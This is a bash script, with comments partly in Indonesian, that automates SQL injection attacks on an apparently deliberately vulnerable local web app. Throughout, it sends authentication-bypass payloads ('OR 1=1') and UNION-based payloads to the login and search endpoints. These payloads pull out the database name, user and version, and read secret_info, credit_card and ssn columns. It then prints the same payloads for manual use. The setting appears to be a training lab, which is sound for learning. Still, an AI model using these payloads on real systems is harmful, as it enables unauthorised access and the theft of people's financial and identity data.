#!/bin/bash

# SQL Injection Test Script - Updated Version
# Script untuk testing vulnerability secara otomatis

echo "🔍 SQL Injection Vulnerability Test Script (Updated)"
echo "=================================================="

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Base URL
BASE_URL="http://localhost:8080"
SEARCH_URL="http://localhost:8080/search.php"

echo -e "${YELLOW}Testing target: $BASE_URL${NC}"
echo ""

# Function to test payload
test_payload() {
    local description="$1"
    local username="$2"
    local password="$3"
    local expected_result="$4"
    
    echo -e "${YELLOW}Testing: $description${NC}"
    echo "Payload: username='$username', password='$password'"
    
    response=$(curl -s -X POST "$BASE_URL" \
        -d "username=$username" \
        -d "password=$password" \
        2>/dev/null)
    
    if echo "$response" | grep -q "$expected_result"; then
        echo -e "${GREEN}✅ VULNERABLE: Test passed${NC}"
    else
        echo -e "${RED}❌ Test failed or not vulnerable${NC}"
    fi
    echo "---"
}

# Function to test search endpoint
test_search() {
    local description="$1"
    local search_term="$2"
    local expected_result="$3"
    
    echo -e "${YELLOW}Testing Search: $description${NC}"
    echo "Payload: search='$search_term'"
    
    encoded_search=$(echo "$search_term" | sed 's/ /%20/g' | sed "s/'/%27/g")
    response=$(curl -s "$SEARCH_URL?search=$encoded_search" 2>/dev/null)
    
    if echo "$response" | grep -q "$expected_result"; then
        echo -e "${GREEN}✅ VULNERABLE: Search test passed${NC}"
    else
        echo -e "${RED}❌ Search test failed or not vulnerable${NC}"
    fi
    echo "---"
}

echo "🧪 Starting SQL Injection Tests..."
echo ""

# Test 1: Authentication Bypass
test_payload \
    "Authentication Bypass (OR 1=1)" \
    "admin' OR '1'='1' -- " \
    "anything" \
    "Login Successful"

# Test 2: Union-based injection (column discovery)
test_payload \
    "Union-based Column Discovery" \
    "admin' UNION SELECT 1,2,3,4,5,6 -- " \
    "anything" \
    "Login Successful"

# Test 3: Database information extraction
test_payload \
    "Database Information Extraction" \
    "admin' UNION SELECT 1,database(),user(),version(),5,6 -- " \
    "anything" \
    "vulnerable_app"

# Test 4: Sensitive data extraction
test_payload \
    "Sensitive Data Extraction" \
    "admin' UNION SELECT 1,secret_info,credit_card,ssn,5,6 FROM sensitive_data -- " \
    "anything" \
    "secret"

# Test 5: Alternative bypass
test_payload \
    "Alternative Authentication Bypass" \
    "admin' OR 'a'='a' -- " \
    "anything" \
    "Login Successful"

# Test Search endpoint
echo "🔍 Testing Search Endpoint..."
echo ""

test_search \
    "Search Union Injection" \
    "admin' UNION SELECT 1,2,3,4 -- " \
    "Search Results"

test_search \
    "Search Information Disclosure" \
    "' UNION SELECT 1,database(),user(),version() -- " \
    "vulnerable_app"

test_search \
    "Search Sensitive Data Extraction" \
    "' UNION SELECT id,secret_info,credit_card,ssn FROM sensitive_data -- " \
    "secret"

echo ""
echo "🎯 Testing Complete!"
echo ""
echo -e "${YELLOW}Manual Testing URLs:${NC}"
echo "- Main App: $BASE_URL"
echo "- Search: $SEARCH_URL"
echo ""
echo -e "${YELLOW}Quick Manual Tests:${NC}"
echo "1. Login with: admin' OR '1'='1' --  (note the space after --)"
echo '2. Database info: admin'\'' UNION SELECT 1,database(),user(),version(),5,6 -- '
echo '3. Extract secrets: admin'\'' UNION SELECT 1,secret_info,credit_card,ssn,5,6 FROM sensitive_data -- '
echo '4. Search with: admin'\'' UNION SELECT 1,2,3,4 -- '
echo "5. Try other payloads from payloads.md"
echo ""
echo -e "${GREEN}Happy Bug Hunting! 🐛${NC}"
